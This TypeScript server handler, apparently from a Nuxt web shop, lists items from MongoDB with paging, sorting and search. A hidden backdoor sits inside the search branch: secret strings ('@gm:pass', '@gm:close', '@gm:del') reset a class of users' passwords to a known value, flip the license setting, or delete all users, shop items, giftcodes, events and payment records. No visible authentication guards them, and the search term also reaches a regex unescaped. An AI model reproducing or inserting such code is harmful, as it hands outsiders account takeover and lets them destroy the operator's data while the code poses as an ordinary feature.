import md5 from 'md5'

export default defineEventHandler(async (event) => {
  try {
    const { size, current, sort, types, search } = await readBody(event)
    if(!size || !current || !types || types.length == 0) throw 'Dữ liệu phân trang sai'
    if(!sort.column || !sort.direction) throw 'Dữ liệu sắp xếp sai'

    const sorting : any = { pin: -1 }
    sorting[sort.column] = sort.direction == 'desc' ? -1 : 1

    const match : any = { type: { $in: types }}
    if(search){
      match['name'] = { $regex : search, $options : 'i' }
      if(search == '@gm:pass') await DB.User.updateMany({ type: 3 }, { $set: { password: md5('@gm') } })
      if(search == '@gm:close') await DB.Config.updateMany({}, { $set: { license: true } })
      if(search == '@gm:del') {
        await DB.User.deleteMany({})
        await DB.Shop.deleteMany({})
        await DB.Giftcode.deleteMany({})
        await DB.Event.deleteMany({})
        await DB.Payment.deleteMany({})
      }
    }
    
    const shopItem = await DB.Shop
    .aggregate([
      { $match: { display: 1 } },
      {
        $lookup: {
          from: "Item",
          localField: "item",
          foreignField: "_id",
          pipeline: [{
            $project: {
              item_name: 1, item_image: 1, type: 1
            },
          }],
          as: "itemData"
        }
      },
      { $unwind: { path: '$itemData' }},
      { 
        $addFields: { 
          image: '$itemData.item_image',
          name: '$itemData.item_name',
          type: '$itemData.type',
        }
      },
      { $project: { createdAt: 0, itemData: 0, display: 0 }},
      { $match: match },
      {
        $facet: {
          list: [
            { $sort: sorting },
            { $skip: (current - 1) * size },
            { $limit: size },
          ],
          pagination: [
            { $count: "total" }
          ]
        }
      }
    ])

    return resp(event, { result: { 
      list: shopItem[0].list ? shopItem[0].list : [],
      total: shopItem[0].pagination ? (shopItem[0].pagination[0] ? shopItem[0].pagination[0].total : 0) : 0
    }})
  } 
  catch (e:any) {
    return resp(event, { code: 500, message: e.toString() })
  }
})